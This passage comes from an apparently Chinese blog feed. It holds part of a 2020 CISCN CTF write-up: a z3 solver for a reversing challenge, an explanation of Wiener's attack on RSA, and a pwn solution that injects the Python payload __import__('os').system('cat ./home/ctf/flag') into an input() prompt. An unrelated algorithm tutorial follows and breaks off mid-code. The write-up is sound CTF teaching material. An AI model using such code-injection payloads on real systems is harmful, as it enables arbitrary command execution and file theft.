class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">solve = Solver()</span><br><span class="line">p=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>):</span><br><span class="line">    p.append(Int(<span class="string">&#x27;p&#x27;</span> + <span class="built_in">str</span>(i)))</span><br><span class="line">v = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>)]</span><br><span class="line">data = [</span><br><span class="line">    <span class="number">0x4F17</span>, <span class="number">0x9CF6</span>, <span class="number">0x8DDB</span>, <span class="number">0x8EA6</span>, <span class="number">0x6929</span>, <span class="number">0x9911</span>,</span><br><span class="line">    <span class="number">0x40A2</span>, <span class="number">0x2F3E</span>, <span class="number">0x62B6</span>, <span class="number">0x4B82</span>, <span class="number">0x486C</span>, <span class="number">0x4002</span>,</span><br><span class="line">    <span class="number">0x52D7</span>, <span class="number">0x2DEF</span>, <span class="number">0x28DC</span>, <span class="number">0x640D</span>, <span class="number">0x528F</span>, <span class="number">0x613B</span>,</span><br><span class="line">    <span class="number">0x4781</span>, <span class="number">0x6B17</span>, <span class="number">0x3237</span>, <span class="number">0x2A93</span>, <span class="number">0x615F</span>, <span class="number">0x50BE</span>,</span><br><span class="line">    <span class="number">0x598E</span>, <span class="number">0x4656</span>, <span class="number">0x5B31</span>, <span class="number">0x313A</span>, <span class="number">0x3010</span>, <span class="number">0x67FE</span>,</span><br><span class="line">    <span class="number">0x4D5F</span>, <span class="number">0x58DB</span>, <span class="number">0x3799</span>, <span class="number">0x60A0</span>, <span class="number">0x2750</span>, <span class="number">0x3759</span>,</span><br><span class="line">    <span class="number">0x8953</span>, <span class="number">0x7122</span>, <span class="number">0x81F9</span>, <span class="number">0x5524</span>, <span class="number">0x8971</span>, <span class="number">0x3A1D</span></span><br><span class="line">]</span><br><span class="line">v[<span class="number">0</span>] = <span class="number">34</span> * p[<span class="number">3</span>] + <span class="number">12</span> * p[<span class="number">0</span>] + <span class="number">53</span> * p[<span class="number">1</span>] + <span class="number">6</span> * p[<span class="number">2</span>] + <span class="number">58</span> * p[<span class="number">4</span>] + <span class="number">36</span> * p[</span><br><span class="line">    <span class="number">5</span>] + p[<span class="number">6</span>]</span><br><span class="line">v[<span class="number">1</span>] = <span class="number">27</span> * p[<span class="number">4</span>] + <span class="number">73</span> * p[<span class="number">3</span>] + <span class="number">12</span> * p[<span class="number">2</span>] + <span class="number">83</span> * p[<span class="number">0</span>] + <span class="number">85</span> * p[<span class="number">1</span>] + <span class="number">96</span> * p[</span><br><span class="line">    <span class="number">5</span>] + <span class="number">52</span> * p[<span class="number">6</span>]</span><br><span class="line">v[<span class="number">2</span>] = <span class="number">24</span> * p[<span class="number">2</span>] + <span class="number">78</span> * p[<span class="number">0</span>] + <span class="number">53</span> * p[<span class="number">1</span>] + <span class="number">36</span> * p[<span class="number">3</span>] + <span class="number">86</span> * p[<span class="number">4</span>] + <span class="number">25</span> * p[</span><br><span class="line">    <span class="number">5</span>] + <span class="number">46</span> * p[<span class="number">6</span>]</span><br><span class="line">v[<span class="number">3</span>] = <span class="number">78</span> * p[<span class="number">1</span>] + <span class="number">39</span> * p[<span class="number">0</span>] + <span class="number">52</span> * p[<span class="number">2</span>] + <span class="number">9</span> * p[<span class="number">3</span>] + <span class="number">62</span> * p[<span class="number">4</span>] + <span class="number">37</span> * p[</span><br><span class="line">    <span class="number">5</span>] + <span class="number">84</span> * p[<span class="number">6</span>]</span><br><span class="line">v[<span class="number">4</span>] = <span class="number">48</span> * p[<span class="number">4</span>] + <span class="number">14</span> * p[<span class="number">2</span>] + <span class="number">23</span> * p[<span class="number">0</span>] + <span class="number">6</span> * p[<span class="number">1</span>] + <span class="number">74</span> * p[<span class="number">3</span>] + <span class="number">12</span> * p[</span><br><span class="line">    <span class="number">5</span>] + <span class="number">83</span> * p[<span class="number">6</span>]</span><br><span class="line">v[<span class="number">5</span>] = <span class="number">15</span> * p[<span class="number">5</span>] + <span class="number">48</span> * p[<span class="number">4</span>] + <span class="number">92</span> * p[<span class="number">2</span>] + <span class="number">85</span> * p[<span class="number">1</span>] + <span class="number">27</span> * p[<span class="number">0</span>] + <span class="number">42</span> * p[</span><br><span class="line">    <span class="number">3</span>] + <span class="number">72</span> * p[<span class="number">6</span>]</span><br><span class="line">v[<span class="number">6</span>] = <span class="number">26</span> * p[<span class="number">5</span>] + <span class="number">67</span> * p[<span class="number">3</span>] + <span class="number">6</span> * p[<span class="number">1</span>] + <span class="number">4</span> * p[<span class="number">0</span>] + <span class="number">3</span> * p[<span class="number">2</span>] + <span class="number">68</span> * p[<span class="number">6</span>]</span><br><span class="line">v[<span class="number">7</span>] = <span class="number">34</span> * p[<span class="number">10</span>] + <span class="number">12</span> * p[<span class="number">7</span>] + <span class="number">53</span> * p[<span class="number">8</span>] + <span class="number">6</span> * p[<span class="number">9</span>] + <span class="number">58</span> * p[<span class="number">11</span>] + <span class="number">36</span> * p[</span><br><span class="line">    <span class="number">12</span>] + p[<span class="number">13</span>]</span><br><span class="line">v[<span class="number">8</span>] = <span class="number">27</span> * p[<span class="number">11</span>] + <span class="number">73</span> * p[<span class="number">10</span>] + <span class="number">12</span> * p[<span class="number">9</span>] + <span class="number">83</span> * p[<span class="number">7</span>] + <span class="number">85</span> * p[<span class="number">8</span>] + <span class="number">96</span> * p[</span><br><span class="line">    <span class="number">12</span>] + <span class="number">52</span> * p[<span class="number">13</span>]</span><br><span class="line">v[<span class="number">9</span>] = <span class="number">24</span> * p[<span class="number">9</span>] + <span class="number">78</span> * p[<span class="number">7</span>] + <span class="number">53</span> * p[<span class="number">8</span>] + <span class="number">36</span> * p[<span class="number">10</span>] + <span class="number">86</span> * p[<span class="number">11</span>] + <span class="number">25</span> * p[</span><br><span class="line">    <span class="number">12</span>] + <span class="number">46</span> * p[<span class="number">13</span>]</span><br><span class="line">v[<span class="number">10</span>] = <span class="number">78</span> * p[<span class="number">8</span>] + <span class="number">39</span> * p[<span class="number">7</span>] + <span class="number">52</span> * p[<span class="number">9</span>] + <span class="number">9</span> * p[<span class="number">10</span>] + <span class="number">62</span> * p[<span class="number">11</span>] + <span class="number">37</span> * p[</span><br><span class="line">    <span class="number">12</span>] + <span class="number">84</span> * p[<span class="number">13</span>]</span><br><span class="line">v[<span class="number">11</span>] = <span class="number">48</span> * p[<span class="number">11</span>] + <span class="number">14</span> * p[<span class="number">9</span>] + <span class="number">23</span> * p[<span class="number">7</span>] + <span class="number">6</span> * p[<span class="number">8</span>] + <span class="number">74</span> * p[<span class="number">10</span>] + <span class="number">12</span> * p[</span><br><span class="line">    <span class="number">12</span>] + <span class="number">83</span> * p[<span class="number">13</span>]</span><br><span class="line">v[<span class="number">12</span>] = <span class="number">15</span> * p[<span class="number">12</span>] + <span class="number">48</span> * p[<span class="number">11</span>] + <span class="number">92</span> * p[<span class="number">9</span>] + <span class="number">85</span> * p[<span class="number">8</span>] + <span class="number">27</span> * p[<span class="number">7</span>] + <span class="number">42</span> * p[</span><br><span class="line">    <span class="number">10</span>] + <span class="number">72</span> * p[<span class="number">13</span>]</span><br><span class="line">v[<span class="number">13</span>] = <span class="number">26</span> * p[<span class="number">12</span>] + <span class="number">67</span> * p[<span class="number">10</span>] + <span class="number">6</span> * p[<span class="number">8</span>] + <span class="number">4</span> * p[<span class="number">7</span>] + <span class="number">3</span> * p[<span class="number">9</span>] + <span class="number">68</span> * p[<span class="number">13</span>]</span><br><span class="line">v[<span class="number">14</span>] = <span class="number">34</span> * p[<span class="number">17</span>] + <span class="number">12</span> * p[<span class="number">14</span>] + <span class="number">53</span> * p[<span class="number">15</span>] + <span class="number">6</span> * p[<span class="number">16</span>] + <span class="number">58</span> * p[<span class="number">18</span>] + <span class="number">36</span> * p[</span><br><span class="line">    <span class="number">19</span>] + p[<span class="number">20</span>]</span><br><span class="line">v[<span class="number">15</span>] = <span class="number">27</span> * p[<span class="number">18</span>] + <span class="number">73</span> * p[<span class="number">17</span>] + <span class="number">12</span> * p[<span class="number">16</span>] + <span class="number">83</span> * p[<span class="number">14</span>] + <span class="number">85</span> * p[</span><br><span class="line">    <span class="number">15</span>] + <span class="number">96</span> * p[<span class="number">19</span>] + <span class="number">52</span> * p[<span class="number">20</span>]</span><br><span class="line">v[<span class="number">16</span>] = <span class="number">24</span> * p[<span class="number">16</span>] + <span class="number">78</span> * p[<span class="number">14</span>] + <span class="number">53</span> * p[<span class="number">15</span>] + <span class="number">36</span> * p[<span class="number">17</span>] + <span class="number">86</span> * p[</span><br><span class="line">    <span class="number">18</span>] + <span class="number">25</span> * p[<span class="number">19</span>] + <span class="number">46</span> * p[<span class="number">20</span>]</span><br><span class="line">v[<span class="number">17</span>] = <span class="number">78</span> * p[<span class="number">15</span>] + <span class="number">39</span> * p[<span class="number">14</span>] + <span class="number">52</span> * p[<span class="number">16</span>] + <span class="number">9</span> * p[<span class="number">17</span>] + <span class="number">62</span> * p[<span class="number">18</span>] + <span class="number">37</span> * p[</span><br><span class="line">    <span class="number">19</span>] + <span class="number">84</span> * p[<span class="number">20</span>]</span><br><span class="line">v[<span class="number">18</span>] = <span class="number">48</span> * p[<span class="number">18</span>] + <span class="number">14</span> * p[<span class="number">16</span>] + <span class="number">23</span> * p[<span class="number">14</span>] + <span class="number">6</span> * p[<span class="number">15</span>] + <span class="number">74</span> * p[<span class="number">17</span>] + <span class="number">12</span> * p[</span><br><span class="line">    <span class="number">19</span>] + <span class="number">83</span> * p[<span class="number">20</span>]</span><br><span class="line">v[<span class="number">19</span>] = <span class="number">15</span> * p[<span class="number">19</span>] + <span class="number">48</span> * p[<span class="number">18</span>] + <span class="number">92</span> * p[<span class="number">16</span>] + <span class="number">85</span> * p[<span class="number">15</span>] + <span class="number">27</span> * p[</span><br><span class="line">    <span class="number">14</span>] + <span class="number">42</span> * p[<span class="number">17</span>] + <span class="number">72</span> * p[<span class="number">20</span>]</span><br><span class="line">v[<span class="number">20</span>] = <span class="number">26</span> * p[<span class="number">19</span>] + <span class="number">67</span> * p[<span class="number">17</span>] + <span class="number">6</span> * p[<span class="number">15</span>] + <span class="number">4</span> * p[<span class="number">14</span>] + <span class="number">3</span> * p[<span class="number">16</span>] + <span class="number">68</span> * p[<span class="number">20</span>]</span><br><span class="line">v[<span class="number">21</span>] = <span class="number">34</span> * p[<span class="number">24</span>] + <span class="number">12</span> * p[<span class="number">21</span>] + <span class="number">53</span> * p[<span class="number">22</span>] + <span class="number">6</span> * p[<span class="number">23</span>] + <span class="number">58</span> * p[<span class="number">25</span>] + <span class="number">36</span> * p[</span><br><span class="line">    <span class="number">26</span>] + p[<span class="number">27</span>]</span><br><span class="line">v[<span class="number">22</span>] = <span class="number">27</span> * p[<span class="number">25</span>] + <span class="number">73</span> * p[<span class="number">24</span>] + <span class="number">12</span> * p[<span class="number">23</span>] + <span class="number">83</span> * p[<span class="number">21</span>] + <span class="number">85</span> * p[</span><br><span class="line">    <span class="number">22</span>] + <span class="number">96</span> * p[<span class="number">26</span>] + <span class="number">52</span> * p[<span class="number">27</span>]</span><br><span class="line">v[<span class="number">23</span>] = <span class="number">24</span> * p[<span class="number">23</span>] + <span class="number">78</span> * p[<span class="number">21</span>] + <span class="number">53</span> * p[<span class="number">22</span>] + <span class="number">36</span> * p[<span class="number">24</span>] + <span class="number">86</span> * p[</span><br><span class="line">    <span class="number">25</span>] + <span class="number">25</span> * p[<span class="number">26</span>] + <span class="number">46</span> * p[<span class="number">27</span>]</span><br><span class="line">v[<span class="number">24</span>] = <span class="number">78</span> * p[<span class="number">22</span>] + <span class="number">39</span> * p[<span class="number">21</span>] + <span class="number">52</span> * p[<span class="number">23</span>] + <span class="number">9</span> * p[<span class="number">24</span>] + <span class="number">62</span> * p[<span class="number">25</span>] + <span class="number">37</span> * p[</span><br><span class="line">    <span class="number">26</span>] + <span class="number">84</span> * p[<span class="number">27</span>]</span><br><span class="line">v[<span class="number">25</span>] = <span class="number">48</span> * p[<span class="number">25</span>] + <span class="number">14</span> * p[<span class="number">23</span>] + <span class="number">23</span> * p[<span class="number">21</span>] + <span class="number">6</span> * p[<span class="number">22</span>] + <span class="number">74</span> * p[<span class="number">24</span>] + <span class="number">12</span> * p[</span><br><span class="line">    <span class="number">26</span>] + <span class="number">83</span> * p[<span class="number">27</span>]</span><br><span class="line">v[<span class="number">26</span>] = <span class="number">15</span> * p[<span class="number">26</span>] + <span class="number">48</span> * p[<span class="number">25</span>] + <span class="number">92</span> * p[<span class="number">23</span>] + <span class="number">85</span> * p[<span class="number">22</span>] + <span class="number">27</span> * p[</span><br><span class="line">    <span class="number">21</span>] + <span class="number">42</span> * p[<span class="number">24</span>] + <span class="number">72</span> * p[<span class="number">27</span>]</span><br><span class="line">v[<span class="number">27</span>] = <span class="number">26</span> * p[<span class="number">26</span>] + <span class="number">67</span> * p[<span class="number">24</span>] + <span class="number">6</span> * p[<span class="number">22</span>] + <span class="number">4</span> * p[<span class="number">21</span>] + <span class="number">3</span> * p[<span class="number">23</span>] + <span class="number">68</span> * p[<span class="number">27</span>]</span><br><span class="line">v[<span class="number">28</span>] = <span class="number">34</span> * p[<span class="number">31</span>] + <span class="number">12</span> * p[<span class="number">28</span>] + <span class="number">53</span> * p[<span class="number">29</span>] + <span class="number">6</span> * p[<span class="number">30</span>] + <span class="number">58</span> * p[<span class="number">32</span>] + <span class="number">36</span> * p[</span><br><span class="line">    <span class="number">33</span>] + p[<span class="number">34</span>]</span><br><span class="line">v[<span class="number">29</span>] = <span class="number">27</span> * p[<span class="number">32</span>] + <span class="number">73</span> * p[<span class="number">31</span>] + <span class="number">12</span> * p[<span class="number">30</span>] + <span class="number">83</span> * p[<span class="number">28</span>] + <span class="number">85</span> * p[</span><br><span class="line">    <span class="number">29</span>] + <span class="number">96</span> * p[<span class="number">33</span>] + <span class="number">52</span> * p[<span class="number">34</span>]</span><br><span class="line">v[<span class="number">30</span>] = <span class="number">24</span> * p[<span class="number">30</span>] + <span class="number">78</span> * p[<span class="number">28</span>] + <span class="number">53</span> * p[<span class="number">29</span>] + <span class="number">36</span> * p[<span class="number">31</span>] + <span class="number">86</span> * p[</span><br><span class="line">    <span class="number">32</span>] + <span class="number">25</span> * p[<span class="number">33</span>] + <span class="number">46</span> * p[<span class="number">34</span>]</span><br><span class="line">v[<span class="number">31</span>] = <span class="number">78</span> * p[<span class="number">29</span>] + <span class="number">39</span> * p[<span class="number">28</span>] + <span class="number">52</span> * p[<span class="number">30</span>] + <span class="number">9</span> * p[<span class="number">31</span>] + <span class="number">62</span> * p[<span class="number">32</span>] + <span class="number">37</span> * p[</span><br><span class="line">    <span class="number">33</span>] + <span class="number">84</span> * p[<span class="number">34</span>]</span><br><span class="line">v[<span class="number">32</span>] = <span class="number">48</span> * p[<span class="number">32</span>] + <span class="number">14</span> * p[<span class="number">30</span>] + <span class="number">23</span> * p[<span class="number">28</span>] + <span class="number">6</span> * p[<span class="number">29</span>] + <span class="number">74</span> * p[<span class="number">31</span>] + <span class="number">12</span> * p[</span><br><span class="line">    <span class="number">33</span>] + <span class="number">83</span> * p[<span class="number">34</span>]</span><br><span class="line">v[<span class="number">33</span>] = <span class="number">15</span> * p[<span class="number">33</span>] + <span class="number">48</span> * p[<span class="number">32</span>] + <span class="number">92</span> * p[<span class="number">30</span>] + <span class="number">85</span> * p[<span class="number">29</span>] + <span class="number">27</span> * p[</span><br><span class="line">    <span class="number">28</span>] + <span class="number">42</span> * p[<span class="number">31</span>] + <span class="number">72</span> * p[<span class="number">34</span>]</span><br><span class="line">v[<span class="number">34</span>] = <span class="number">26</span> * p[<span class="number">33</span>] + <span class="number">67</span> * p[<span class="number">31</span>] + <span class="number">6</span> * p[<span class="number">29</span>] + <span class="number">4</span> * p[<span class="number">28</span>] + <span class="number">3</span> * p[<span class="number">30</span>] + <span class="number">68</span> * p[<span class="number">34</span>]</span><br><span class="line">v[<span class="number">35</span>] = <span class="number">34</span> * p[<span class="number">38</span>] + <span class="number">12</span> * p[<span class="number">35</span>] + <span class="number">53</span> * p[<span class="number">36</span>] + <span class="number">6</span> * p[<span class="number">37</span>] + <span class="number">58</span> * p[<span class="number">39</span>] + <span class="number">36</span> * p[</span><br><span class="line">    <span class="number">40</span>] + p[<span class="number">41</span>]</span><br><span class="line">v[<span class="number">36</span>] = <span class="number">27</span> * p[<span class="number">39</span>] + <span class="number">73</span> * p[<span class="number">38</span>] + <span class="number">12</span> * p[<span class="number">37</span>] + <span class="number">83</span> * p[<span class="number">35</span>] + <span class="number">85</span> * p[</span><br><span class="line">    <span class="number">36</span>] + <span class="number">96</span> * p[<span class="number">40</span>] + <span class="number">52</span> * p[<span class="number">41</span>]</span><br><span class="line">v[<span class="number">37</span>] = <span class="number">24</span> * p[<span class="number">37</span>] + <span class="number">78</span> * p[<span class="number">35</span>] + <span class="number">53</span> * p[<span class="number">36</span>] + <span class="number">36</span> * p[<span class="number">38</span>] + <span class="number">86</span> * p[</span><br><span class="line">    <span class="number">39</span>] + <span class="number">25</span> * p[<span class="number">40</span>] + <span class="number">46</span> * p[<span class="number">41</span>]</span><br><span class="line">v[<span class="number">38</span>] = <span class="number">78</span> * p[<span class="number">36</span>] + <span class="number">39</span> * p[<span class="number">35</span>] + <span class="number">52</span> * p[<span class="number">37</span>] + <span class="number">9</span> * p[<span class="number">38</span>] + <span class="number">62</span> * p[<span class="number">39</span>] + <span class="number">37</span> * p[</span><br><span class="line">    <span class="number">40</span>] + <span class="number">84</span> * p[<span class="number">41</span>]</span><br><span class="line">v[<span class="number">39</span>] = <span class="number">48</span> * p[<span class="number">39</span>] + <span class="number">14</span> * p[<span class="number">37</span>] + <span class="number">23</span> * p[<span class="number">35</span>] + <span class="number">6</span> * p[<span class="number">36</span>] + <span class="number">74</span> * p[<span class="number">38</span>] + <span class="number">12</span> * p[</span><br><span class="line">    <span class="number">40</span>] + <span class="number">83</span> * p[<span class="number">41</span>]</span><br><span class="line">v[<span class="number">40</span>] = <span class="number">15</span> * p[<span class="number">40</span>] + <span class="number">48</span> * p[<span class="number">39</span>] + <span class="number">92</span> * p[<span class="number">37</span>] + <span class="number">85</span> * p[<span class="number">36</span>] + <span class="number">27</span> * p[</span><br><span class="line">    <span class="number">35</span>] + <span class="number">42</span> * p[<span class="number">38</span>] + <span class="number">72</span> * p[<span class="number">41</span>]</span><br><span class="line">v[<span class="number">41</span>] = <span class="number">26</span> * p[<span class="number">40</span>] + <span class="number">67</span> * p[<span class="number">38</span>] + <span class="number">6</span> * p[<span class="number">36</span>] + <span class="number">4</span> * p[<span class="number">35</span>] + <span class="number">3</span> * p[<span class="number">37</span>] + <span class="number">68</span> * p[<span class="number">41</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>):</span><br><span class="line">    solve.add(v[i] == data[i])</span><br><span class="line"><span class="built_in">print</span>(solve.check())</span><br><span class="line">m = solve.model()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(((m[p[i]])).as_long()),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h3><h4 id="crypto–bd"><a href="#crypto–bd" class="headerlink" title="crypto–bd"></a>crypto–bd</h4><p>e很大的，d可能就会比较小，可能会满足Wiener’s attack的条件</p><p>低解密指数攻击</p><p>原理：当pq很大时，phin大小接近n</p><p>e*d-1=k*phin</p><p>两边同除d*phin</p><p>e/phin-k/d=1/(d*phin)</p><p>因为d*phin很大，所以e/N稍大于k/d</p><p>这样我们通过展开e/N连分数求出每个渐进分数</p><p>即可求出phin，再联立解方程求出私钥p,q</p><p>解题使用github上的开源工具https:<em>//github.com/pablocelayes/rsa-wiener-attack</em>  </p><p><img src="/2020/09/06/2020ciscn%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1597981949399-1600656836325.png" class="lazyload" data-srcset="/2020/09/06/2020ciscn%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1597981949399-1600656836325.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1597981949399"></p><p>直接得到d</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">m = long_to_bytes(<span class="built_in">pow</span>(c, d, n))</span><br><span class="line"><span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure><p>得到flag</p><h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><h4 id="pwn–babyjsc"><a href="#pwn–babyjsc" class="headerlink" title="pwn–babyjsc"></a>pwn–babyjsc</h4><p><img src="/2020/09/06/2020ciscn%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1597982402953-1600656836325.png" class="lazyload" data-srcset="/2020/09/06/2020ciscn%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1597982402953-1600656836325.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1597982402953"></p><p>随便输入一点东西报python的input错误</p><p>从而输入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;cat ./home/ctf/flag&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/2020/09/06/2020ciscn%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1597982542144.png" class="lazyload" data-srcset="/2020/09/06/2020ciscn%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1597982542144.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1597982542144"></p>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ciscn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法入门--保持一致</title>
      <link href="2020/08/17/%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8-%E4%BF%9D%E6%8C%81%E4%B8%80%E8%87%B4/"/>
      <url>2020/08/17/%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8-%E4%BF%9D%E6%8C%81%E4%B8%80%E8%87%B4/</url>
      
        <content type="html"><![CDATA[<p>今天学一下遍历的算法，主要应用方向是用来简单的数据压缩</p><span id="more"></span><h3 id="0x01-基本问题及解决"><a href="#0x01-基本问题及解决" class="headerlink" title="0x01 基本问题及解决"></a>0x01 基本问题及解决</h3><p>假定有了对应于一组排队等待人员的帽子方向列表，喊出几条命令使得，使得所有人的帽子都朝向一个方向</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pleaseConform</span>(<span class="params">caps</span>):</span></span><br><span class="line">    start=forward=backward=<span class="number">0</span></span><br><span class="line">    intervals=[]  </span><br><span class="line">    caps=caps+[<span class="string">&#x27;END&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(caps)):</span><br><span class="line">        <span class="keyword">if</span> caps[start]!=caps[i]:</span><br><span class="line">            intervals.append((start,i-<span class="number">1</span>,caps[start]))</span><br><span class="line">            <span class="keyword">if</span> caps[start]==<span class="string">&#x27;F&#x27;</span>:</span><br><span class="line">                forward+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span> :</span><br><span class="line">                backward +=<span class="number">1</span></span><br><span class="line">            start = i</span><br><span class="line">    <span class="keyword">if</span>  forward&lt;backward:</span><br><span class="line">        flip=<span class="string">&quot;F&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flip=<span class="string">&quot;B&quot;</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> intervals:</span><br><span class="line">        <span class="keyword">if</span> t[<span class="number">2</span>]== flip:</span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>]==t[<span class="number">1</span>]:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;people in position&#x27;</span>,t[<span class="number">1</span>],<span class="string">&#x27;filp you caps!&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;people in positions&#x27;</span>,t[<span class="number">0</span>],<span class="string">&#x27;through&#x27;</span>,t[<span class="number">1</span>],<span class="string">&#x27;filp you caps!&#x27;</span>)</span><br></pre></td></tr></table></figure><p>以上用到的算法思想是计算一个”区间”的列表，对应于各段戴帽子方式相同的连续人群。同时区间列表记录区间的三种性质为一个元素，开始位置、结束位置以及帽子的方向，且用forward和backword两个计数器，一但该区间列表方向确定，就在该方向的计数器上加一，最后统计比较计数器的值，从而决定是输出区间列表里的帽子方向是正还是反的值</p><h3 id="0x02-代码优化"><a href="#0x02-代码优化" class="headerlink" title="0x02 代码优化"></a>0x02 代码优化</h3><p>以上算法并不完美，究其原因主要是进行了两次遍历，第一次是对帽子方向列表的遍历，第二次是对区间列表的遍历，如果进行一次遍历，是否能够直接得出我们想要的输出命令呢</p><p><strong>tips: 正戴区间和反戴区间的数量最多差1，观察第一个人是正戴还是反戴，如果是正戴，则正戴的区间数量永远不小于反戴，如果是反戴，则反戴的区间数量永远不小于正戴。</strong></p><p>从而我们可以得到单次遍历的算法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#原版</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pleaseConformOnepass</span>(<span class="params">caps</span>):</span></span><br><span class="line">    caps=caps+[caps[<span class="number">0</span>]] <span class="comment">#这里加上帽子方向列表的最后一个元素，目的是方便循环</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(caps)):</span><br><span class="line">        <span class="keyword">if</span> caps[i]!=caps[i-<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">if</span> caps[i]!=caps[<span class="number">0</span>]:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;People in postion&#x27;</span>,i,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;through&#x27;</span>,i-<span class="number">1</span>,<span class="string">&#x27;flip your caps&#x27;</span>)</span><br><span class="line"><span class="comment">#改进一下，输出更好看一些</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pleaseConformOnepass</span>(<span class="params">caps</span>):</span></span><br><span class="line">    caps=caps+[caps[<span class="number">0</span>]] <span class="comment">#这里加上帽子方向列表的最后一个元素，目的是方便循环</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(caps)):</span><br><span class="line">        <span class="keyword">if</span> 